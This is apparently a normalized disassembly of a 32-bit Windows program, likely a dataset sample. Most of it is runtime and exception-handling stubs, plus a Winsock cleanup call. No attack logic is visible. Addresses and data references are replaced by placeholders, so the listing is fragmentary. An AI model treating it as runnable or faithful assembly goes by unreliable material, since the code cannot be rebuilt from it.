int3
sub_415875
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_415cdd
push 0xd
call sub_417961
pop ecx
retn
sub_4160ac
push 0xd
call sub_417961
pop ecx
retn
sub_4160e5
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_415f4b
pop ecx
mov [ rw-data ] 0x1
sub_416430
push 0xc
call sub_417961
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_41643c
push 0x0
call [ EncodePointer@IAT ]
retn
sub_416445
call [ TlsAlloc@IAT ]
retn 0x4
sub_416561
push 0xd
call sub_417961
pop ecx
retn
sub_41656a
push 0xc
call sub_417961
pop ecx
retn
sub_416720
push 0xd
call sub_417961
pop ecx
retn
sub_41672c
push 0xc
call sub_417961
pop ecx
retn
sub_416a2b
push 0x8
push r--data
call sub_415830
call sub_4165ec
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_418914
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_416a4b
xor eax eax
inc eax
retn
sub_416a64
call sub_4165ec
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_416a2b
call eax
sub_416a9b
xor eax eax
inc eax
retn
sub_416aaf
push sub_416a2b
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_416b27
push 0xe
call sub_417961
pop ecx
retn
sub_416bb8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_416de9
push sub_416da7
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_417807
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_417961
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417a31
push 0xa
call sub_417961
pop ecx
retn
sub_417b9c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_417bf1
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_417d65
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_417961
pop ecx
sub_417da1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_417db0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_417f0b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_417f3c
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_418d2e
retn
sub_418026
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_417f50
add esp 0xc
pop ebp
retn 0x4
sub_418059
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_418f55
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_41808b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_417f50
add esp 0xc
pop ebp
retn 0x8
sub_418d0d
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_418cba
add esp 0x10
pop ebp
retn
sub_418d25
push 0x2
call sub_41580b
sub_418f29
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_418e60
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_418f74
call eax
retn
sub_418f80
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_419050
sub_418f96
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_419050
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_41941f
mov eax sub_41a3b5
mov [ rw-data ] eax
mov [ rw-data ] sub_419aab
mov [ rw-data ] sub_419a5f
mov [ rw-data ] sub_419a98
mov [ rw-data ] sub_419a01
mov [ rw-data ] eax
mov [ rw-data ] sub_41a32d
mov [ rw-data ] sub_419a1d
mov [ rw-data ] sub_41997f
mov [ rw-data ] sub_41990b
retn
sub_41947f
mov edi edi
push ebp
mov ebp esp
call sub_41941f
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_41a3d8
sub_4198ec
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_419a5f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419a1d
add esp 0x10
pop ebp
retn
sub_419a98
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41990b
pop ecx
pop ecx
pop ebp
retn
sub_419aab
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41997f
pop ecx
pop ecx
pop ebp
retn
sub_41a400
mov [ ecx ] r--data
jmp sub_413803
sub_41a55e
push [ ebp - 0x14 ]
call sub_41a491
pop ecx
retn
sub_41a5a2
call sub_4165ec
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_4165ec
dec [ eax + 0x90 ]
sub_41a644
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_41a64d
mov esp [ ebp - 0x18 ]
call sub_416a2b
sub_41a6f5
push 0x4
mov eax sub_41dfc7
call sub_41b65e
call sub_4165ec
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_416a64
call sub_416a77
sub_41a7ce
mov eax [ ebp - 0x14 ]
call sub_41a5bc
retn
sub_41aa45
xor eax eax
inc eax
retn
sub_41aa49
mov esp [ ebp - 0x18 ]
call sub_416a2b
sub_41aade
xor eax eax
inc eax
retn
sub_41aae2
mov esp [ ebp - 0x18 ]
call sub_416a2b
sub_41afd5
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_413835
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41b694
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_41d76d
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41d7b2
mov ecx [ ebp + 0x8 ]
jmp sub_413803
sub_41d7ba
mov eax r--data
jmp sub_419595
sub_41d7c4
mov ecx [ ebp - 0x10 ]
jmp sub_413803
sub_41d7cc
mov eax r--data
jmp sub_419595
sub_41d7d6
mov ecx [ ebp - 0x10 ]
jmp sub_4026ef
sub_41d7de
mov ecx [ ebp - 0x10 ]
jmp sub_413803
sub_41d7e6
mov eax r--data
jmp sub_419595
sub_41d7f0
mov ecx [ ebp - 0x10 ]
jmp sub_4026ef
sub_41d7f8
mov eax r--data
jmp sub_419595
sub_41d802
lea ecx [ ebp - 0x44 ]
jmp sub_4026ef
sub_41d80a
mov eax r--data
jmp sub_419595
sub_41d814
mov eax r--data
jmp sub_419595
sub_41d81e
mov eax r--data
jmp sub_419595
sub_41d828
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
j_sub_4066d6
jmp sub_4066d6
sub_41d83b
mov eax r--data
jmp sub_419595
sub_41d845
mov eax r--data
jmp sub_419595
sub_41d84f
mov eax r--data
jmp sub_419595
sub_41d859
mov eax r--data
jmp sub_419595
sub_41d863
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41d871
mov eax r--data
jmp sub_419595
sub_41d87b
mov ebx [ ebp - 0x10 ]
add ebx 0x4f04
jmp sub_402593
sub_41d889
mov eax r--data
jmp sub_419595
sub_41d893
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41d8a1
mov eax r--data
jmp sub_419595
sub_41d8ab
lea esi [ ebp - 0x24 ]
jmp sub_405f2c
sub_41d8b3
mov eax r--data
jmp sub_419595
sub_41d8bd
lea esi [ ebp - 0x2c ]
jmp sub_405f2c
sub_41d8c5
mov eax r--data
jmp sub_419595
sub_41d8cf
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_405f2c
sub_41d8da
mov esi [ ebp + 0x8 ]
add esi 0x14
jmp sub_405f2c
sub_41d8e5
mov eax r--data
jmp sub_419595
sub_41d8ef
lea eax [ ebp - 0xfc ]
jmp sub_40a44d
sub_41d8fa
mov eax r--data
jmp sub_419595
sub_41d904
mov esi [ ebp + 0x8 ]
jmp sub_405f2c
sub_41d90c
mov eax r--data
jmp sub_419595
sub_41d916
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0xc ]
call sub_40114f
sub_41d92f
lea esi [ ebp - 0x24 ]
jmp sub_405f2c
sub_41d937
mov eax r--data
jmp sub_419595
sub_41d941
push [ ebp - 0x18 ]
call sub_40114f
retn
sub_41d94a
lea esi [ ebp - 0x28 ]
jmp sub_405f2c
sub_41d952
mov eax r--data
jmp sub_419595
sub_41d95c
lea eax [ ebp - 0x90 ]
push eax
call sub_40114f
retn
sub_41d969
lea esi [ ebp - 0x6c ]
jmp sub_405f2c
sub_41d971
lea esi [ ebp - 0x5c ]
jmp sub_405f2c
sub_41d979
lea esi [ ebp - 0x30 ]
jmp sub_405f2c
sub_41d981
mov eax r--data
jmp sub_419595
sub_41d98b
lea eax [ ebp - 0x84 ]
push eax
call sub_40114f
retn
sub_41d998
lea esi [ ebp - 0x4c ]
jmp sub_405f2c
sub_41d9a0
lea esi [ ebp - 0x3c ]
jmp sub_405f2c
sub_41d9a8
mov eax r--data
jmp sub_419595
sub_41d9b2
mov eax r--data
jmp sub_419595
sub_41d9bc
lea esi [ ebp - 0x30 ]
jmp sub_405f2c
sub_41d9c4
lea esi [ ebp - 0x20 ]
jmp sub_405f2c
sub_41d9cc
lea esi [ ebp - 0x40 ]
jmp sub_405f2c
sub_41d9d4
mov eax r--data
jmp sub_419595
sub_41d9de
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_407e40
retn
sub_41d9eb
mov eax [ ebp + 0x8 ]
add eax 0x18
push eax
call sub_407e40
retn
sub_41d9f8
mov esi [ ebp + 0x8 ]
add esi 0x30
jmp sub_405f2c
sub_41da03
mov eax r--data
jmp sub_419595
sub_41da0d
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41da1b
mov eax r--data
jmp sub_419595
sub_41da25
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41da33
mov eax r--data
jmp sub_419595
sub_41da3d
lea esi [ ebp - 0x1d88 ]
jmp sub_405f2c
sub_41da48
lea esi [ ebp - 0x1d6c ]
jmp sub_405f2c
sub_41da53
lea esi [ ebp - 0x1d5c ]
jmp sub_405f2c
sub_41da5e
lea esi [ ebp - 0x1d4c ]
jmp sub_405f2c
sub_41da69
mov eax r--data
jmp sub_419595
sub_41da73
lea esi [ ebp - 0x10c4 ]
jmp sub_405f2c
sub_41da7e
lea eax [ ebp - 0x1098 ]
push eax
call sub_40114f
retn
sub_41da8b
lea esi [ ebp - 0x10a8 ]
jmp sub_405f2c
sub_41da96
mov eax r--data
jmp sub_419595
sub_41daa0
lea eax [ ebp - 0x8f0 ]
push eax
call sub_40114f
retn
sub_41daad
lea eax [ ebp - 0x834 ]
push eax
call sub_40114f
retn
sub_41daba
mov eax r--data
jmp sub_419595
sub_41dac4
lea esi [ ebp - 0x20 ]
jmp sub_405f2c
sub_41dacc
lea esi [ ebp - 0x30 ]
jmp sub_405f2c
sub_41dad4
mov eax r--data
jmp sub_419595
sub_41dade
lea esi [ ebp - 0x30 ]
jmp sub_405f2c
sub_41dae6
lea esi [ ebp - 0x20 ]
jmp sub_405f2c
sub_41daee
mov eax r--data
jmp sub_419595
sub_41daf8
lea esi [ ebp - 0x34 ]
jmp sub_405f2c
sub_41db00
lea esi [ ebp - 0x44 ]
jmp sub_405f2c
sub_41db08
lea esi [ ebp - 0x24 ]
jmp sub_405f2c
sub_41db10
mov eax r--data
jmp sub_419595
sub_41db1a
lea esi [ ebp - 0x68 ]
jmp sub_405f2c
sub_41db22
lea eax [ ebp - 0x58 ]
push eax
call sub_40114f
retn
sub_41db2c
lea eax [ ebp - 0x34 ]
push eax
call sub_40114f
retn
sub_41db36
mov eax r--data
jmp sub_419595
sub_41db40
lea esi [ ebp - 0x508 ]
jmp sub_405f2c
sub_41db4b
lea eax [ ebp - 0x4e0 ]
push eax
call sub_40114f
retn
sub_41db58
lea eax [ ebp - 0x4bc ]
push eax
call sub_40114f
retn
sub_41db65
mov eax r--data
jmp sub_419595
sub_41db6f
lea eax [ ebp - 0x8260 ]
push eax
call sub_40114f
retn
sub_41db7c
lea eax [ ebp - 0x823c ]
push eax
call sub_40114f
retn
sub_41db89
mov eax r--data
jmp sub_419595
sub_41db93
lea esi [ ebp - 0x2e8 ]
jmp sub_405f2c
sub_41db9e
lea eax [ ebp - 0x2d8 ]
push eax
call sub_40114f
retn
sub_41dbab
lea eax [ ebp - 0x2b4 ]
push eax
call sub_40114f
retn
sub_41dbb8
mov eax r--data
jmp sub_419595
sub_41dbc2
lea eax [ ebp - 0x34 ]
push eax
call sub_40114f
retn
sub_41dbcc
lea esi [ ebp - 0x44 ]
jmp sub_405f2c
sub_41dbd4
mov eax r--data
jmp sub_419595
sub_41dbde
lea eax [ ebp - 0x80 ]
push eax
call sub_40114f
retn
sub_41dbe8
lea esi [ ebp - 0x90 ]
jmp sub_405f2c
sub_41dbf3
lea eax [ ebp - 0x34 ]
push eax
call sub_40114f
retn
sub_41dbfd
mov eax r--data
jmp sub_419595
sub_41dc07
lea esi [ ebp - 0x10c ]
jmp sub_405f2c
sub_41dc12
lea esi [ ebp - 0xec ]
jmp sub_405f2c
sub_41dc1d
lea esi [ ebp - 0xfc ]
jmp sub_405f2c
sub_41dc28
mov eax r--data
jmp sub_419595
sub_41dc32
lea esi [ ebp - 0x3044 ]
jmp sub_405f2c
sub_41dc3d
mov eax r--data
jmp sub_419595
sub_41dc47
lea esi [ ebp - 0x490 ]
jmp sub_405f2c
sub_41dc52
lea esi [ ebp - 0x4a0 ]
jmp sub_405f2c
sub_41dc5d
mov eax r--data
jmp sub_419595
sub_41dc67
lea esi [ ebp - 0x20 ]
jmp sub_405f2c
sub_41dc6f
mov eax r--data
jmp sub_419595
sub_41dc79
lea esi [ ebp - 0x3024 ]
jmp sub_405f2c
sub_41dc84
mov eax r--data
jmp sub_419595
sub_41dc8e
lea esi [ ebp - 0x4038 ]
jmp sub_405f2c
sub_41dc99
mov eax r--data
jmp sub_419595
sub_41dca3
lea esi [ ebp - 0x38 ]
jmp sub_405f2c
sub_41dcab
lea eax [ ebp - 0x7c ]
push eax
call sub_40114f
retn
sub_41dcb5
lea esi [ ebp - 0x48 ]
jmp sub_405f2c
sub_41dcbd
lea esi [ ebp - 0x58 ]
jmp sub_405f2c
sub_41dcc5
mov eax r--data
jmp sub_419595
sub_41dccf
lea esi [ ebp - 0xf8c ]
jmp sub_405f2c
sub_41dcda
mov eax r--data
jmp sub_419595
sub_41dce4
lea eax [ ebp - 0x338 ]
push eax
call sub_40114f
retn
sub_41dcf1
lea eax [ ebp - 0x2d4 ]
push eax
call sub_40114f
retn
sub_41dcfe
mov eax r--data
jmp sub_419595
sub_41dd08
lea esi [ ebp - 0x30 ]
jmp sub_405f2c
sub_41dd10
lea eax [ ebp - 0x30 ]
push eax
call sub_407e40
retn
sub_41dd1a
lea esi [ ebp - 0x30 ]
jmp sub_405f2c
sub_41dd22
mov eax r--data
jmp sub_419595
sub_41dd2c
lea esi [ ebp - 0x1c ]
jmp sub_405f2c
sub_41dd34
mov eax r--data
jmp sub_419595
sub_41dd3e
lea eax [ ebp - 0x23c ]
push eax
call sub_40114f
retn
sub_41dd4b
lea eax [ ebp - 0x26c ]
jmp sub_4097be
sub_41dd56
lea esi [ ebp - 0x24c ]
jmp sub_405f2c
sub_41dd61
lea esi [ ebp - 0x280 ]
jmp sub_405f2c
sub_41dd6c
mov eax r--data
jmp sub_419595
sub_41dd76
lea eax [ ebp - 0x478 ]
jmp sub_406c46
sub_41dd81
mov eax r--data
jmp sub_419595
sub_41dd8b
lea esi [ ebp - 0x20 ]
jmp sub_405f2c
sub_41dd93
lea eax [ ebp - 0x280 ]
jmp sub_406c46
sub_41dd9e
mov eax r--data
jmp sub_419595
sub_41dda8
lea eax [ ebp - 0x18c8 ]
jmp sub_406c46
sub_41ddb3
lea esi [ ebp - 0x1b6c ]
jmp sub_405f2c
sub_41ddbe
mov eax r--data
jmp sub_419595
sub_41ddc8
lea eax [ ebp - 0x18c8 ]
jmp sub_406c46
sub_41ddd3
mov eax r--data
jmp sub_419595
sub_41dddd
lea esi [ ebp - 0x880 ]
jmp sub_405f2c
sub_41dde8
mov eax r--data
jmp sub_419595
sub_41ddf2
lea eax [ ebp - 0x270 ]
jmp sub_406c46
sub_41ddfd
lea esi [ ebp - 0x2a0 ]
jmp sub_405f2c
sub_41de08
lea esi [ ebp - 0x290 ]
jmp sub_405f2c
sub_41de13
lea eax [ ebp - 0x290 ]
push eax
call sub_407e40
retn
sub_41de20
lea esi [ ebp - 0x280 ]
jmp sub_405f2c
sub_41de2b
lea eax [ ebp - 0x280 ]
push eax
call sub_407e40
retn
sub_41de38
mov eax r--data
jmp sub_419595
sub_41de42
mov esi [ ebp - 0x18 ]
jmp sub_405f2c
sub_41de4a
lea eax [ ebp - 0x50 ]
push eax
call sub_407e40
retn
sub_41de54
mov esi [ ebp - 0x18 ]
jmp sub_405f2c
sub_41de5c
lea eax [ ebp - 0x40 ]
push eax
call sub_407e40
retn
sub_41de66
lea esi [ ebp - 0x28 ]
jmp sub_405f2c
sub_41de6e
lea eax [ ebp - 0x58 ]
push eax
call sub_4086cd
retn
sub_41de78
lea eax [ ebp - 0x50 ]
push eax
call sub_407e40
retn
sub_41de82
lea eax [ ebp - 0x40 ]
push eax
call sub_407e40
retn
sub_41de8c
lea esi [ ebp - 0x28 ]
jmp sub_405f2c
sub_41de94
lea eax [ ebp - 0x50 ]
push eax
call sub_407e40
retn
sub_41de9e
lea eax [ ebp - 0x40 ]
push eax
call sub_407e40
retn
sub_41dea8
lea esi [ ebp - 0x28 ]
jmp sub_405f2c
sub_41deb0
mov eax r--data
jmp sub_419595
sub_41deba
lea esi [ ebp - 0x60 ]
jmp sub_405f2c
sub_41dec2
lea eax [ ebp - 0x34 ]
push eax
call sub_40114f
retn
sub_41decc
mov eax r--data
jmp sub_419595
sub_41ded6
mov esi rw-data
jmp sub_405f2c
sub_41dee0
mov eax r--data
jmp sub_419595
sub_41deea
mov esi rw-data
jmp sub_405f2c
sub_41def4
mov eax r--data
jmp sub_419595
sub_41defe
mov esi rw-data
jmp sub_405f2c
sub_41df08
mov eax r--data
jmp sub_419595
sub_41df12
mov ebx rw-data
jmp sub_402593
sub_41df1c
mov eax r--data
jmp sub_419595
sub_41df26
push rw-data
call sub_40114f
retn
sub_41df31
mov eax r--data
jmp sub_419595
sub_41df3b
mov esi rw-data
jmp sub_405f2c
sub_41df45
mov eax r--data
jmp sub_419595
sub_41df4f
mov esi rw-data
jmp sub_405f2c
sub_41df59
mov eax r--data
jmp sub_419595
sub_41df63
mov esi rw-data
jmp sub_405f2c
sub_41df6d
mov eax r--data
jmp sub_419595
sub_41df77
mov esi rw-data
jmp sub_405f2c
sub_41df81
mov eax r--data
jmp sub_419595
sub_41df8b
mov esi rw-data
jmp sub_405f2c
sub_41df95
mov eax r--data
jmp sub_419595
sub_41df9f
mov esi rw-data
jmp sub_405f2c
sub_41dfa9
mov eax r--data
jmp sub_419595
sub_41dfb3
mov esi rw-data
jmp sub_405f2c
sub_41dfbd
mov eax r--data
jmp sub_419595
sub_41dfc7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_417f3c
mov eax r--data
jmp sub_419595
sub_41e026
cmp [ rw-data ] 0x0
jne r-xdata
push sub_41eb0f
call sub_413278
pop ecx
retn
call sub_405c10
sub_41e067
push esi
mov esi rw-data
call sub_405d11
push sub_41eb3d
call sub_413278
pop ecx
pop esi
retn
sub_41e07f
push 0xffffffff
call sub_4046cc
push eax
mov eax 0x70737200
mov ecx rw-data
call sub_406b4c
push sub_41eb4a
call sub_413278
pop ecx
retn
sub_41e0a2
push esi
mov esi rw-data
call sub_405d11
push sub_41eb54
call sub_413278
pop ecx
pop esi
retn
sub_41e216
push esi
mov esi rw-data
call sub_405d11
push sub_41ec21
call sub_413278
pop ecx
pop esi
retn
sub_41e313
push 0xffffffff
call sub_4046cc
push eax
mov eax 0x70aa0201
mov ecx rw-data
call sub_406b4c
push sub_41ecbe
call sub_413278
pop ecx
retn
sub_41e336
push esi
mov esi rw-data
call sub_405d11
push sub_41ecc8
call sub_413278
pop ecx
pop esi
retn
sub_41e52c
push esi
mov [ rw-data ] sub_40c3d4
mov [ rw-data ] 0x30383201
mov [ rw-data ] 0x64
mov [ rw-data ] 0x927c0
mov [ rw-data ] 0x7a120
call sub_4046cc
mov esi eax
mov eax rw-data
call sub_40403f
pop esi
retn
sub_41e572
push esi
mov [ rw-data ] sub_40cab6
mov [ rw-data ] 0x30177102
mov [ rw-data ] 0x50
mov [ rw-data ] 0x124f80
mov [ rw-data ] 0x186a0
call sub_4046cc
mov esi eax
mov eax rw-data
call sub_40403f
pop esi
retn
sub_41e5b8
push esi
mov [ rw-data ] sub_40cdfe
mov [ rw-data ] 0x30290001
mov [ rw-data ] 0x32
mov [ rw-data ] 0x124f80
mov [ rw-data ] 0x493e0
call sub_4046cc
mov esi eax
mov eax rw-data
call sub_40403f
pop esi
retn
sub_41e5fe
push esi
mov esi rw-data
call sub_405d11
push sub_41ecd5
call sub_413278
pop ecx
pop esi
retn
sub_41e6a6
push esi
mov esi rw-data
call sub_405d11
push sub_41ece2
call sub_413278
pop ecx
pop esi
retn
sub_41e800
push 0xffffffff
call sub_4046cc
push eax
mov eax 0x80cd9101
mov ecx rw-data
call sub_406b4c
push sub_41ed4f
call sub_413278
pop ecx
retn
sub_41e823
push esi
mov esi rw-data
call sub_405d11
push sub_41ed59
call sub_413278
pop ecx
pop esi
retn
sub_41e887
push esi
mov esi rw-data
call sub_405d11
push sub_41ed66
call sub_413278
pop ecx
pop esi
retn
sub_41e8e3
push 0xffffffff
call sub_4046cc
push eax
mov eax 0x8094e303
mov ecx rw-data
call sub_406b4c
push sub_41ed73
call sub_413278
pop ecx
retn
sub_41e906
push esi
mov esi rw-data
call sub_405d11
push r-xdata
call sub_413278
pop ecx
pop esi
retn
sub_41eb0f
retn
WSACleanup
jmp [ WSACleanup@IAT ]
sub_41eb16
mov eax sub_41df31
call sub_4198ec
push ecx
or [ esp + 0xc ] 0xffffffff
push rw-data
call sub_40114f
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41eb3d
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41eb4a
mov eax rw-data
jmp sub_406c46
sub_41eb54
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41ec21
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41ecbe
mov eax rw-data
jmp sub_406c46
sub_41ecc8
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41ecd5
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41ece2
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41ed4f
mov eax rw-data
jmp sub_406c46
sub_41ed59
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41ed66
push esi
mov esi rw-data
call sub_405f2c
pop esi
retn
sub_41ed73
mov eax rw-data
jmp sub_406c46
